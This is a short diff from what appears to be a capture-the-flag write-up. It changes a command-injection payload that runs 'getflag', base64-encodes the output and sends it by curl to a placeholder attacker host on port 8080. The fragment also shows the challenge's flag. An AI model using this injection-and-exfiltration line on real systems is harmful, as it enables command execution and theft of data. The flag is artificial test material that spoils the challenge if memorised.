@@ -379,7 +379,7 @@ python3 -m http.server 8080
 
 Payload:
 ```
-$(curl [YOUR_IP]/?x=`getflag | base64`)
+$(curl [YOUR_IP]:8080/?x=`getflag | base64`)
 ```
 
 Flag: `fa6v5ateaw21peobuub8ipe6s`
